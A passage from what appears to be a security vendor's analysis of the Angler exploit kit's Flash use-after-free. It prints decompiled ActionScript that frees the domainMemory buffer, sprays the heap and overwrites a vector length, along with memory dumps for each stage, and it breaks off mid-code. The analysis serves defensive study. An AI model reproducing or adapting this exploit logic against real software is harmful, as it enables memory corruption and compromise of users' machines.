class="crayon-sy">.</span><span class="crayon-v">attacking_buffer</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5678c890816100-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">main_to_worker</span><span class="crayon-sy">.</span><span class="crayon-e">send</span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">message_hello</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5678c890816100-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5678c890816100-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p></p>
<p style="text-align: center;"><strong>Figure 7. </strong>Angler&#8217;s ActionScript that Assigns a Buffer to domainMemory to Begin the Exploitation Process</p>
<p>The following displays the memory map for the pertinent objects after the first stage, specifically showing domainMemory and ByteArray having a pointer (<span style="color: #ffcc00;">yellow</span>) to the ByteArrayData buffer (actually the ByteArrayData was set to domainMemory):</p>
<p>ApplicationDomain<br />
05591c60 10bb6558 80025f01 05555f98 03e831f0<br />
05591c70 03ea5040 039f3080 03b672b8 03b661e8<br />
+0x00: vtable of ApplicationDomain<br />
+0x10: pointer to domainMemory</p>
<p>domainMemory<br />
03ea5040 10c99fc8 03b4c190 0577f6d0 039f3080<br />
03ea5050 03ea6020 <span style="color: #ffcc00;">05069000</span> 00002000 03a36ea0<br />
03ea5060 00000003 03ea5040 039f1070 039f1040<br />
03ea5070 00000000 00000000<br />
+0x00: vtable of domainMemory<br />
+0x14: pointer to ByteArrayData</p>
<p>ByteArray<br />
03a4f578 10c890a8 00000002 <span style="color: #ffcc00;">05069000</span> 00002000<br />
03a4f588 00002000 00000000<br />
0x00: vtable of ByteArray<br />
0x08: pointer to ByteArrayData</p>
<p>ByteArrayData<br />
<span style="color: #ffcc00;">05069000</span> 33333333 33333333 33333333 33333333<br />
05069010 33333333 33333333 33333333 33333333<br />
05069020 33333333 33333333 33333333 33333333<br />
05069030 33333333 33333333 33333333 33333333<br />
05069040 33333333 33333333 33333333 33333333<br />
05069050 33333333 33333333 33333333 33333333</p>
<p>In the second stage, the worker thread receives the message and clears the “attacking_buffer” ByteArray assigned to “ApplicationDomain.currentDomain.domainMemory” in the first phase. However, the script does not notify the ApplicationDomain that the “attacking_buffer” was cleared, which causes “ApplicationDomain.currentDomain.domainMemory” to retain a pointer to the ByteArrayData. The lack of notification in the event of clearing the ByteArray causes the UAF vulnerability. Figure 8 shows the ActionScript within Angler’s malicious SWF file that clears the buffer without notifying the ApplicationDomain.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69285f56797725822038" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
      protected function on_main_to_worker(param1:Event) : void
      {
         var _loc3_:uint = 0;
         var _loc4_:ByteArray = null;
         var _loc5_:ByteArray = null;
         var _loc2_:* = this.main_to_worker.receive();
         if(_loc2_ == this.message_hello)
         {
            _loc3_ = this.page_size;
            _loc4_ = new ByteArray();
            _loc4_.length = _loc3_;
            _loc5_ = new ByteArray();
            _loc5_.length = _loc3_;
            _loc5_.clear();
            this.attacking_buffer.clear();
            _loc4_.clear();
            this.protecting_buffer.length = this.protecting_buffer_size;
            this.fill_buffer(this.protecting_buffer,this.protecting_buffer_filler);
            Worker.current.setSharedProperty(this.protecting_buffer_name,this.protecting_buffer);
            this.worker_to_main.send(this.message_world);
         }
      }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69285f56797725822038-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-2">2</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-4">4</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-6">6</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-8">8</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-10">10</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-12">12</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-14">14</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-16">16</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-18">18</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-20">20</div><div class="crayon-num" data-line="crayon-5f69285f56797725822038-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f56797725822038-22">22</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69285f56797725822038-1"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">protected</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">on_main_to_worker</span><span class="crayon-sy">(</span><span class="crayon-v">param1</span><span class="crayon-o">:</span><span class="crayon-v">Event</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">void</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc3_</span><span class="crayon-o">:</span><span class="crayon-v">uint</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc4_</span><span class="crayon-o">:</span><span class="crayon-v">ByteArray</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc5_</span><span class="crayon-o">:</span><span class="crayon-v">ByteArray</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc2_</span><span class="crayon-o">:</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">main_to_worker</span><span class="crayon-sy">.</span><span class="crayon-e">receive</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-v">_loc2_</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">message_hello</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc3_</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">page_size</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc4_</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">ByteArray</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc4_</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">_loc3_</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc5_</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">ByteArray</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc5_</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">_loc3_</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc5_</span><span class="crayon-sy">.</span><span class="crayon-e">clear</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">attacking_buffer</span><span class="crayon-sy">.</span><span class="crayon-e">clear</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc4_</span><span class="crayon-sy">.</span><span class="crayon-e">clear</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">protecting_buffer</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">protecting_buffer_size</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">fill_buffer</span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">protecting_buffer</span><span class="crayon-sy">,</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">protecting_buffer_filler</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Worker</span><span class="crayon-sy">.</span><span class="crayon-v">current</span><span class="crayon-sy">.</span><span class="crayon-e">setSharedProperty</span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">protecting_buffer_name</span><span class="crayon-sy">,</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">protecting_buffer</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">worker_to_main</span><span class="crayon-sy">.</span><span class="crayon-e">send</span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">message_world</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f56797725822038-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f56797725822038-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p></p>
<p style="text-align: center;"><strong> Figure 8.</strong> Angler&#8217;s ActionScript that Clears the Buffer Without Notifying the ApplicationDomain</p>
<p>The following shows a memory map of the objects after the second stage, showing the ByteArray being cleared and the buffer of ByteArrayData being freed, but the domainMemory retaining the pointer (<span style="color: #ffcc00;">yellow</span>) to the ByteArrayData buffer:</p>
<p>domainMemory<br />
03ea5040 10c99fc8 03b4c190 0577f6d0 039f3080<br />
03ea5050 03ea6020 <span style="color: #ffcc00;">05069000</span> 00002000 03a36ea0<br />
03ea5060 00000003 03ea5040 039f1070 039f1040<br />
03ea5070 00000000 00000000<br />
+0x00: vtable of domainMemory<br />
+0x14: pointer to ByteArrayData</p>
<p>ByteArray<br />
03a4f578 10c890a8 00000001 00000000 00000000<br />
03a4f588 00000000 00000000</p>
<p>ByteArrayData<br />
<span style="color: #ffcc00;">05069000</span> 00000000 00000000 00000000 00000000</p>
<h3>Exploit Analysis</h3>
<p>After triggering the UAF vulnerability, the third stage begins the exploitation process. This is a rather special and unique UAF vulnerability, as the ByteArray object can be any size, which allows exploiters to create and free an arbitrary sized heap block, fill it with an arbitrary sized object (the simplest method is filling the freed heap block with the vector object), and modify the arbitrary offset of this freed buffer to an arbitrary value. he freed buffer is still considered a ByteArray buffer of domainMemory, allowing the exploiter to read and write directly to the ByteArray buffer using alchemy opcodes. For example, the alchemy opcodes ‘op_li32’ and ‘op_si32’ can read and write 32-bits memory of the ByteArray buffer of domainMemory.</p>
<p>The exploitation process continues by taking over the freed ByteArrayData heap block and replacing it with a vector of the same size. Angler’s exploit code, seen in Figure 9, takes over the ByteArrayData buffer in the function “make_filling_by_uints” and changes the vector length to a very large size by using the alchemy opcodes ‘op_si32’ in the function “magic_write_uint”.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69285f5679b211703890" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
      private function take_over_buffer() : Boolean
      {
         var _loc1_:uint = this.magic_read_uint(0);
         if(_loc1_ != this.protecting_buffer_filler)
         {
            return false;
         }
         this.make_spray_by_buffers_make_holes();
         this.make_filling_by_uints();
         _loc1_ = this.magic_read_uint(0);
         if(_loc1_ == this.protecting_buffer_filler)
         {
            return false;
         }
         return true;
      }

      private function attack() : Boolean
      {
         var _loc1_:uint = 0;
         var _loc2_:uint = 0;
         var _loc3_:uint = this.byte_array_size;
         while(_loc2_ &lt; _loc3_)
         {
            _loc1_ = this.magic_read_uint(_loc2_);
            if(_loc1_ == this.vector_elements)
            {
               _loc1_ = this.magic_read_uint(_loc2_ + (this.x86_url_checked &lt;&lt; 3));
               if(_loc1_ == this.vector_signature_0)
               {  //unchained_elements = 1073741824 = 0x40000000
                  this.magic_write_uint(_loc2_,this.unchained_elements); 
                  return true;
               }
            }
            _loc2_ = _loc2_ + (this.x86_url_checked &lt;&lt; 2);
         }
         return false;
      }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-2">2</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-4">4</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-6">6</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-8">8</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-10">10</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-12">12</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-14">14</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-16">16</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-18">18</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-20">20</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-22">22</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-24">24</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-26">26</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-28">28</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-30">30</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-32">32</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-34">34</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-36">36</div><div class="crayon-num" data-line="crayon-5f69285f5679b211703890-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5679b211703890-38">38</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69285f5679b211703890-1"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">take_over_buffer</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">Boolean</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc1_</span><span class="crayon-o">:</span><span class="crayon-v">uint</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">magic_read_uint</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-v">_loc1_</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">protecting_buffer_filler</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">make_spray_by_buffers_make_holes</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">make_filling_by_uints</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">_loc1_</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">magic_read_uint</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-v">_loc1_</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">protecting_buffer_filler</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" 